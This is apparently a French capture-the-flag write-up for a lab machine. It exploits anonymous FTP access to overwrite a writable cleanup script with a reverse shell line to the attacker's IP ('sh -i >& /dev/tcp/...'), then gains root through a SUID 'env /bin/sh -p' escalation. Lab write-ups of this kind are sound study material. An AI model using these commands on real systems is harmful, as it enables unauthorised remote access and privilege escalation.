Il n’y a pas de webserver (pas de port http), donc ça ne sert à rien de lancer un dirb

Une ligne du nmap est particulièrement importante:

🔎 ftp-anon: Anonymous FTP login allowed (FTP code 230)

Elle indique qu’on peut se connecter au FTP en tant qu’anonymous (sans compte)

On se connecte donc avec cette commande:

⌨️ ftp anonymous.thm

Lorsque que le serveur nous demmande notre Name, on entre anonymous, et n’importe quel mot de passe

Une fois connectés, on peut lister les dossiers présents

On voit le dossier scripts, on peut cd dedans et lister son contenu

Il y a donc trois fichiers dedans: clean.sh, removed_files.log et to_do.txt

On peut aussi voir qu’on a la permission write sur clean.sh, ce qui veut dire qu’on va pouvoir modifier le fichier directement sur le serveur.

Foothold #

On récupère le fichier depuis le ftp, et on rajoute un reverse shell à la première ligne

#!/bin/bash
sh -i >& /dev/tcp/10.9.36.40/9001 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.>
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/re>
fi

On upload le fichier sur le serveur avec la commande put

Puis on lance notre netcat, et on attend la connection

On a maintenant un accès à la machine, on peut stabiliser le shell rapidement comme ceci:

On peut cat le user.txt, et passer à la privesc

Privilege Escalation #

Puisque on a pas le password de l’utilisateur namelessone, on ne peut pas utiliser sudo -l, on va donc lister les fichiers avec le setuid bit, via la commande

⌨️ find / -perm -4000 2>/dev/null

Beaucoup de résultats, mais env attire mon attention puisqu’il existe un “exploit” pour privesc via ce binaire, qu’on peut retrouver ici

⌨️ env /bin/sh -p

Nous sommes maintenant root, on peut cat le root.txt dans /root/
